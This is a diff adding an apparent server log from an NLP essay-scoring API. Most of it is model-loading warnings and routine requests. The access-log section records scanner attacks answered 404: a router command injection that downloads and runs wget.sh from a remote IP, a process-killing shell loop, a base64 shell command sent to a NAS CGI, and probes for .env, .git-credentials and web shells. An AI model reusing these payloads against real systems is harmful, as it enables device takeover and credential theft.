@@ -1,0 +1,575 @@
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.bias', 'roberta.pooler.dense.weight']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Loading pretrained XLM-Roberta, this may take a while...
+Loading tokenizer for english
+Loading tagger for english
+Loading lemmatizer for english
+Loading NER tagger for english
+==================================================
+Active language: english
+==================================================
+Traceback (most recent call last):
+  File "main.py", line 17, in <module>
+    from apis.base import api_router
+  File "/code/aisolus/aisolus/apis/base.py", line 12, in <module>
+    from apis.api_routes import (
+  File "/code/aisolus/aisolus/apis/api_routes/route_get_info_word.py", line 9, in <module>
+    from src.inference_function import syn_ant_dict
+  File "/code/aisolus/aisolus/src/inference_function.py", line 64, in <module>
+    fasttext_model = fasttext.load_model(nlp_cfg.fasttext_model_path)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fasttext/FastText.py", line 441, in load_model
+    return _FastText(model_path=path)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fasttext/FastText.py", line 98, in __init__
+    self.f.loadModel(model_path)
+KeyboardInterrupt
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.weight', 'roberta.pooler.dense.bias']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Special tokens have been added in the vocabulary, make sure the associated word embeddings are fine-tuned or trained.
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+INFO:     Uvicorn running on http://0.0.0.0:8289 (Press CTRL+C to quit)
+Uvicorn running on http://0.0.0.0:8289 (Press CTRL+C to quit)
+INFO:     Started parent process [523050]
+Started parent process [523050]
+Loading pretrained XLM-Roberta, this may take a while...
+Loading tokenizer for english
+Loading tagger for english
+Loading lemmatizer for english
+Loading NER tagger for english
+==================================================
+Active language: english
+==================================================
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.bias', 'roberta.pooler.dense.weight']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.bias', 'roberta.pooler.dense.weight']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.bias', 'roberta.pooler.dense.weight']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+Some weights of the model checkpoint at textattack/roberta-base-MRPC were not used when initializing RobertaForSequenceClassification: ['roberta.pooler.dense.weight', 'roberta.pooler.dense.bias']
+- This IS expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing RobertaForSequenceClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Special tokens have been added in the vocabulary, make sure the associated word embeddings are fine-tuned or trained.
+Special tokens have been added in the vocabulary, make sure the associated word embeddings are fine-tuned or trained.
+Special tokens have been added in the vocabulary, make sure the associated word embeddings are fine-tuned or trained.
+Special tokens have been added in the vocabulary, make sure the associated word embeddings are fine-tuned or trained.
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.weight', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.weight', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.weight', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.bias', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.weight', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.dense.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.classifier.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.dense.bias', 'mask_predictions.dense.weight', 'mask_predictions.classifier.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.bias', 'lm_predictions.lm_head.dense.bias', 'mask_predictions.LayerNorm.weight']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+Some weights of the model checkpoint at microsoft/deberta-v3-base were not used when initializing DebertaV2Model: ['lm_predictions.lm_head.dense.weight', 'mask_predictions.LayerNorm.bias', 'mask_predictions.classifier.weight', 'lm_predictions.lm_head.LayerNorm.bias', 'lm_predictions.lm_head.dense.bias', 'lm_predictions.lm_head.bias', 'mask_predictions.dense.weight', 'mask_predictions.dense.bias', 'lm_predictions.lm_head.LayerNorm.weight', 'mask_predictions.LayerNorm.weight', 'mask_predictions.classifier.bias']
+- This IS expected if you are initializing DebertaV2Model from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).
+- This IS NOT expected if you are initializing DebertaV2Model from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).
+INFO:     Started server process [523488]
+INFO:     Started server process [523487]
+Started server process [523488]
+Started server process [523487]
+INFO:     Waiting for application startup.
+INFO:     Waiting for application startup.
+Waiting for application startup.
+Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Application startup complete.
+Application startup complete.
+Application startup complete.
+INFO:     Started server process [523506]
+Started server process [523506]
+INFO:     Waiting for application startup.
+Waiting for application startup.
+INFO:     Application startup complete.
+Application startup complete.
+Loading pretrained XLM-Roberta, this may take a while...
+Loading tokenizer for english
+Loading tagger for english
+Loading lemmatizer for english
+Loading NER tagger for english
+==================================================
+Active language: english
+==================================================
+2024-07-18 05:34:44 INFO:     4.156.240.179:0 - "GET / HTTP/1.1" 404 Not Found
+Loading pretrained XLM-Roberta, this may take a while...
+Loading tokenizer for english
+Loading tagger for english
+Loading lemmatizer for english
+Loading NER tagger for english
+==================================================
+Active language: english
+==================================================
+2024-07-18 05:49:23 INFO:     45.148.10.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 05:51:37 INFO:     35.160.127.143:0 - "GET / HTTP/1.1" 404 Not Found
+Loading pretrained XLM-Roberta, this may take a while...
+Loading tokenizer for english
+Loading tagger for english
+Loading lemmatizer for english
+Loading NER tagger for english
+==================================================
+Active language: english
+==================================================
+2024-07-18 06:27:03 INFO:     54.217.83.13:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 06:42:29 INFO:     162.158.179.157:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 06:46:21 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 06:46:36 INFO:     172.68.225.236:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 06:48:03 INFO:     92.249.48.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 06:55:55 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+2024-07-18 06:55:55 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+2024-07-18 07:05:16 INFO:     194.55.186.238:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 07:17:37 INFO:     148.251.250.52:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 07:17:37 INFO:     148.251.250.50:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 07:20:59 INFO:     192.227.190.158:0 - "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwktZQlcXHg2NVxceDYzXFx4NjhcXHg2ZlxceDIwXFx4MjdcXHg3OFxceDc4XFx4NzhcXHg3OFxceDc4XFx4NjNcXHg2M1xceDYzXFx4NjNcXHg2M1xceDI3fHNo HTTP/1.1" 404 Not Found
+2024-07-18 07:24:50 INFO:     172.71.215.25:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 07:26:23 INFO:     162.158.114.246:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 07:28:55 INFO:     172.68.225.81:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 07:40:37 INFO:     43.155.160.173:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 07:42:09 INFO:     172.71.219.49:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 07:44:00 INFO:     117.216.183.40:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 07:54:24 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 08:11:12 INFO:     172.68.225.24:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 08:12:27 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 08:23:11 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 08:27:03 INFO:     46.174.191.28:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 09:07:23 INFO:     78.153.140.177:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 09:08:34 INFO:     35.92.210.108:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 09:08:36 INFO:     172.71.215.53:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 09:24:20 INFO:     185.150.26.220:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 09:27:35 INFO:     172.71.215.26:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 09:35:36 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 09:39:43 INFO:     185.224.128.43:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 09:49:28 INFO:     31.24.44.159:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 09:49:42 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
+2024-07-18 09:49:43 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
+2024-07-18 09:50:09 INFO:     109.205.213.18:0 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+2024-07-18 09:50:40 INFO:     109.205.213.18:0 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+2024-07-18 09:50:40 INFO:     109.205.213.18:0 - "GET /codebuild.yml HTTP/1.1" 404 Not Found
+2024-07-18 09:58:42 INFO:     43.155.183.138:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 10:14:08 INFO:     91.92.247.56:0 - "GET /secure/.env HTTP/1.1" 404 Not Found
+2024-07-18 10:17:46 INFO:     162.158.114.121:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:20:49 INFO:     162.158.114.12:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:26:37 INFO:     172.71.219.50:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:28:06 INFO:     172.68.225.237:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 10:28:12 INFO:     162.158.178.73:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:30:34 INFO:     172.71.214.120:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:31:14 INFO:     94.156.69.228:0 - "POST /ALFA_DATA/alfacgiapi/perl.alfa HTTP/1.1" 404 Not Found
+2024-07-18 10:31:14 INFO:     94.156.69.228:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 10:31:14 INFO:     94.156.69.228:0 - "POST /alfacgiapi/perl.alfa HTTP/1.1" 404 Not Found
+2024-07-18 10:31:15 INFO:     94.156.69.228:0 - "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 404 Not Found
+2024-07-18 10:31:15 INFO:     94.156.69.228:0 - "POST /wp-plain.php HTTP/1.1" 404 Not Found
+2024-07-18 10:31:15 INFO:     94.156.69.228:0 - "GET /cwtvdxbk.php?Fox=d3wL7 HTTP/1.1" 404 Not Found
+2024-07-18 10:34:37 INFO:     162.158.178.82:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:40:50 INFO:     172.71.219.20:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 10:41:38 INFO:     172.68.225.25:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 11:02:30 INFO:     172.68.225.25:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 11:05:56 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
